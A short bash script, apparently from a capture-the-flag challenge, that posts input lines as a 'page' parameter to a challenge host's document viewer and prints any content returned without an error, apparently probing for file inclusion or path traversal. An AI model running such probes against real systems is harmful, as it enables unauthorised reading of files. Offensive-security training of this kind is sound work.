#!/usr/bin/env bash
T="https://kicyber-b17458a15769-vaultdocs-1-0-0.chals.io/"
while IFS= read -r p; do
  [ -z "$p" ] && continue
  resp=$(curl -sk -m 20 -X POST --data-urlencode "page=$p" "$T")
  if echo "$resp" | grep -q 'error-box'; then
    :
  else
    echo ">>> FOUND: $p"
    echo "$resp" | sed -n '/<div class="viewer">/,/<\/div>/p' | sed 's/<div class="viewer">//; s/<\/div>//' | head -40
    echo
  fi
done
